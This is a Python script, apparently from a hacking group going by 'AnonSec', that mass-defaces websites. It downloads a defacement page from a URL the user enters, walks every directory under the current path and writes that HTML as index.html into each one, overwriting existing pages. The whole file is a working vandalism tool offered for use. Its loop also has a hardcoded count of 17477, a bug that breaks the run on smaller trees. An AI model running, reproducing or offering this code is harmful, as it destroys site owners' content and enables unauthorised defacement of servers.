from itertools import chain
import os
from glob import glob
import subprocess

print ("/n/n ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n")
print ("							         __  ____               _____ _   				 ")
print ("							/\/\  _ _\ \/ / _\ ___  ___ _ _|___ /| |_ 				 ")
print ("						   /    \| '__\  /\ \ / _ \/ __| '__||_ \| __|				 ")
print ("				          / /\/\ \ |_ /  \_\ \  __/ (__| |  ___) | |_ 				 ")
print ("						  \/    \/_(_)_/\_\__/\___|\___|_| |____/ \__|				 ")
print ("                                            										 ")
print ("																					 ")
print ("                                Brought To You By : AnonSec                          ")
print ("                                      Coded By : Mr.XSecr3t                      \n\n")
print ("/n/n ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n")

deface  = input("[?] Enter deface url : ")
file_name = "index.html"
print("[!] Downloading deface page")
process = subprocess.Popen(["curl", "-s" , deface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, error = process.communicate()
if out == "":
	print("[!] Either deface not found or url is incorrect")
	exit(1)
else:
	name = input("[?] Enter file name [default : %s]: " % file_name)
	if name != "":
		file_name = name

print("[!] Parsing deface page")
try:
	html = "<html>" + out.decode().split("<html>")[1]
except IndexError:
	print("[!] Either deface not found or url is incorrect")
	exit(1)
l = 1
print("[~] Finding all directories and subdirectories in %s" % os.getcwd())
dirs = list(chain.from_iterable(glob(os.path.join(x[0])) for x in os.walk(os.getcwd())))
td = len(dirs)
print("[!] Total directories to deface : %s" % str(td))
print("[~] Running defacer")

for x in range(17477):
	file = os.path.join(dirs[x], file_name)
	print("\t({}) {}".format(str(x+1).center(len(str(td))), file))
	try:
		with open(file, "w") as f:
			f.write(html)
			f.close()
		l+=1
	except IOError as e:
		pass

print("[!] Total files : %d"%td)
print("[!] Files added : %d"%l)
print("[!] Files not added : %d"%(td-l))